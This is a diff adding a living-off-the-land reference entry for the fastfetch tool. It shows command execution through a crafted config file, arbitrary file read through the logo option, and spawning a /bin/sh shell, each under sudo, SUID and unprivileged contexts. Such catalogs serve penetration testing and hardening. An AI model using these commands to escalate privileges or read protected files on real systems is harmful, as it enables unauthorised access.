@@ -1,0 +1,47 @@
+fastfetch
+=========
+
+Command
+-------
+
+[Sudo]
+    echo '{"modules":[{"type":"command","key":"x","text":"exec /path/to/command"}]}' >/path/to/temp-file.jsonc
+fastfetch -c /path/to/temp-file.jsonc
+
+[SUID]
+    echo '{"modules":[{"type":"command","key":"x","text":"exec /path/to/command"}]}' >/path/to/temp-file.jsonc
+fastfetch -c /path/to/temp-file.jsonc
+
+[Unprivileged]
+    echo '{"modules":[{"type":"command","key":"x","text":"exec /path/to/command"}]}' >/path/to/temp-file.jsonc
+fastfetch -c /path/to/temp-file.jsonc
+
+File read
+---------
+
+[Sudo]
+    fastfetch --file /path/to/input-file
+    The file content is used as the logo while some other information is displayed on its right.
+
+[SUID]
+    fastfetch --file /path/to/input-file
+    The file content is used as the logo while some other information is displayed on its right.
+
+[Unprivileged]
+    fastfetch --file /path/to/input-file
+    The file content is used as the logo while some other information is displayed on its right.
+
+Shell
+-----
+
+[Sudo]
+    echo '{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}' >/path/to/temp-file.jsonc
+fastfetch -c /path/to/temp-file.jsonc
+
+[SUID]
+    echo '{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}' >/path/to/temp-file.jsonc
+fastfetch -c /path/to/temp-file.jsonc
+
+[Unprivileged]
+    echo '{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}' >/path/to/temp-file.jsonc
+fastfetch -c /path/to/temp-file.jsonc
